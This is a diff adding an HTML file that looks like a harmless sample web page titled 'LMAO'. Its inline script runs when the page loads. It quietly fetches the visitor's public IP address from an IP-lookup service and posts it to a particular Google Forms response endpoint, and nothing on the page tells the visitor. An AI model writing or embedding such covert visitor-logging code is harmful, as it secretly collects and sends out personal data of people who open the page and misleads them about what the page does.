@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LMAO</title>
+</head>
+<body>
+    <h1>Welcome to My Web Page</h1>
+    <p>This is a sample paragraph</p>
+    <script>
+        fetch('https://api.ipify.org/')
+        .then(r => r.ok ? r.text() : Promise.reject('Network response was not ok'))
+        .catch(e => ('undefined', console.error('Error:', e)))
+        .then(data => {
+            let formData = new FormData();
+            formData.append("entry.102987324", data);
+            return fetch("https://docs.google.com/forms/d/e/1FAIpQLSfytFu26ON6M2-UNAROj_Qw4fMgw1wx7IdsCoJ8fBBWmlVfhA/formResponse", { method: "POST", body: formData, mode: "no-cors" });
+        })
+        .catch(error => console.error("Error:", error));
+    </script>
+</body>
+</html>
